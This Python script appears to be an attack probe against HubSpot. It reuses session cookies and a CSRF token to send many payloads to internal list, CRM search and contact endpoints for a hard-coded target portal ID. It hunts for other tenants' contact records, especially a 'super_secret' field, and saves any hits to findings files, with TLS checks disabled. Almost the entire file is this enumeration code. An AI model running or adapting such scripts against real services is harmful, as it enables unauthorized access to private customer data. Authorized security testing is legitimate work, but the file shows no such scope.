#!/usr/bin/env python3
"""
Test the API endpoints discovered in the list page HTML
Especially: /inbounddb-lists/v1/list-membership-search
"""

import requests
import json
import os
import re
import urllib3
from dotenv import load_dotenv

urllib3.disable_warnings()
load_dotenv()

SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
TARGET_PORTAL = '46962361'

print("="*80)
print("TESTING DISCOVERED LIST APIs")
print("="*80)

session = requests.Session()

# Set cookies
for cookie in SESSION_COOKIES.split('; '):
    if '=' in cookie:
        key, value = cookie.split('=', 1)
        session.cookies.set(key, value, domain='.hubspot.com')

# Extract CSRF token
csrf_token = None
if 'hubspotapi-csrf=' in SESSION_COOKIES:
    match = re.search(r'hubspotapi-csrf=([^;]+)', SESSION_COOKIES)
    if match:
        csrf_token = match.group(1)

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'application/json',
    'Content-Type': 'application/json',
    'Referer': f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/lists',
}

if csrf_token:
    headers['X-HubSpot-CSRF-hubspotapi'] = csrf_token

# ============================================================================
# 1. TEST LIST MEMBERSHIP SEARCH API
# ============================================================================

print("\n[1] TESTING LIST MEMBERSHIP SEARCH API")
print("="*80)

list_search_url = f'https://app.hubspot.com/inbounddb-lists/v1/list-membership-search'

# Try different payloads
payloads = [
    {
        'portalId': TARGET_PORTAL,
        'limit': 100,
    },
    {
        'portalId': TARGET_PORTAL,
        'query': '',
        'limit': 100,
    },
    {
        'portalId': TARGET_PORTAL,
        'listIds': [1],
        'limit': 100,
    },
    {
        'portalId': TARGET_PORTAL,
        'listIds': [1, 2, 3, 4, 5],
        'limit': 100,
    },
    {
        'portalId': TARGET_PORTAL,
        'contactId': 1,
    },
    {
        'portalId': TARGET_PORTAL,
        'contactId': '1',
    },
]

for i, payload in enumerate(payloads, 1):
    print(f"\n[Payload {i}] {json.dumps(payload)[:80]}...")

    try:
        r = session.post(list_search_url, headers=headers, json=payload, verify=False, timeout=10)

        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            print(f"  *** SUCCESS! ***")

            try:
                data = r.json()
                print(f"  Response: {json.dumps(data, indent=2)[:800]}")

                # Check for contact data
                if 'super_secret' in json.dumps(data).lower() or 'firstname' in json.dumps(data).lower():
                    print(f"\n  *** CONTAINS CONTACT DATA! ***")
                    print(f"\n  FULL RESPONSE:")
                    print(json.dumps(data, indent=2))

                    with open('/home/user/Hub/findings/LIST_API_CONTACT_DATA.json', 'w') as f:
                        json.dump(data, f, indent=2)
            except:
                print(f"  Response (not JSON): {r.text[:400]}")
        elif r.status_code != 404:
            try:
                error = r.json()
                print(f"  Error: {json.dumps(error, indent=2)[:300]}")
            except:
                print(f"  Response: {r.text[:200]}")
    except Exception as e:
        print(f"  Error: {str(e)[:100]}")

# ============================================================================
# 2. TEST OTHER DISCOVERED APIs
# ============================================================================

print("\n" + "="*80)
print("[2] TESTING OTHER DISCOVERED APIs")
print("="*80)

discovered_apis = [
    {
        'url': f'https://app.hubspot.com/customer-object-types/v1/for-portal',
        'method': 'GET',
        'params': {'portalId': TARGET_PORTAL}
    },
    {
        'url': f'https://app.hubspot.com/framework-builder/v1/read/metadata/type/all/batch',
        'method': 'POST',
        'data': {'portalId': TARGET_PORTAL}
    },
    {
        'url': f'https://app.hubspot.com/inbounddb-meta/v1/object-types/events/for-portal',
        'method': 'GET',
        'params': {'portalId': TARGET_PORTAL}
    },
    {
        'url': f'https://app.hubspot.com/sales/v4/views/search',
        'method': 'GET',
        'params': {
            'portalId': TARGET_PORTAL,
            'namespace': 'LISTS',
            'exactNameSearch': 'true'
        }
    },
]

for api in discovered_apis:
    url = api['url']
    method = api['method']

    print(f"\n{method} {url[:70]}...")

    try:
        if method == 'GET':
            r = session.get(url, headers=headers, params=api.get('params'), verify=False, timeout=10)
        else:
            r = session.post(url, headers=headers, json=api.get('data'), verify=False, timeout=10)

        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            try:
                data = r.json()
                print(f"  Data: {json.dumps(data, indent=2)[:500]}")

                if 'firstname' in json.dumps(data).lower() or 'contact' in json.dumps(data).lower():
                    print(f"  *** Contains contact-related data! ***")
            except:
                print(f"  Response: {r.text[:200]}")
    except Exception as e:
        print(f"  Error: {str(e)[:100]}")

# ============================================================================
# 3. TRY DIRECT CONTACT OBJECT SEARCH
# ============================================================================

print("\n" + "="*80)
print("[3] TRYING CONTACT OBJECT SEARCH")
print("="*80)

search_urls = [
    f'https://app.hubspot.com/api/crm/v3/objects/contacts/search',
    f'https://app.hubspot.com/crm-search/search',
    f'https://app.hubspot.com/contacts-search/v1/search',
]

search_payloads = [
    {
        'portalId': TARGET_PORTAL,
        'filterGroups': [],
        'properties': ['firstname', 'super_secret', 'email'],
        'limit': 10,
    },
    {
        'portalId': TARGET_PORTAL,
        'query': '*',
        'properties': ['firstname', 'super_secret'],
        'limit': 10,
    },
    {
        'portalId': TARGET_PORTAL,
        'objectTypeId': '0-1',
        'properties': ['firstname', 'super_secret'],
        'limit': 10,
    },
]

for url in search_urls:
    for payload in search_payloads:
        print(f"\nPOST {url[:60]}...")
        print(f"  Payload: {json.dumps(payload)[:100]}...")

        try:
            r = session.post(url, headers=headers, json=payload, verify=False, timeout=10)

            print(f"  Status: {r.status_code}")

            if r.status_code == 200:
                print(f"  *** SUCCESS! ***")

                try:
                    data = r.json()
                    print(f"  Response: {json.dumps(data, indent=2)[:800]}")

                    if 'super_secret' in json.dumps(data).lower():
                        print(f"\n  *** CONTAINS super_secret! ***")
                        print(f"\n  FULL RESPONSE:")
                        print(json.dumps(data, indent=2))

                        with open('/home/user/Hub/findings/CONTACT_SEARCH_SUCCESS.json', 'w') as f:
                            json.dump(data, f, indent=2)
                except:
                    print(f"  Response: {r.text[:300]}")
        except Exception as e:
            print(f"  Error: {str(e)[:100]}")

# ============================================================================
# 4. TRY CONTACT VIEW/TABLE ENDPOINTS
# ============================================================================

print("\n" + "="*80)
print("[4] TRYING CONTACT VIEW/TABLE ENDPOINTS")
print("="*80)

view_urls = [
    f'https://app.hubspot.com/api/crm-objects/v1/objects/contacts?portalId={TARGET_PORTAL}&limit=10',
    f'https://app.hubspot.com/crm-objects/v1/view/all?portalId={TARGET_PORTAL}&objectTypeId=0-1',
    f'https://app.hubspot.com/contacts/v1/contact/all?portalId={TARGET_PORTAL}&count=10',
]

for url in view_urls:
    print(f"\nGET {url[:70]}...")

    try:
        r = session.get(url, headers=headers, verify=False, timeout=10)

        print(f"  Status: {r.status_code}")

        if r.status_code == 200:
            try:
                data = r.json()
                print(f"  *** SUCCESS! ***")
                print(f"  Data: {json.dumps(data, indent=2)[:800]}")

                if 'super_secret' in json.dumps(data).lower() or 'firstname' in json.dumps(data).lower():
                    print(f"\n  *** CONTAINS CONTACT DATA! ***")

                    with open('/home/user/Hub/findings/CONTACT_VIEW_SUCCESS.json', 'w') as f:
                        json.dump(data, f, indent=2)
            except:
                print(f"  Response: {r.text[:300]}")
    except Exception as e:
        print(f"  Error: {str(e)[:100]}")

print("\n" + "="*80)
print("API TESTING COMPLETE")
print("="*80)
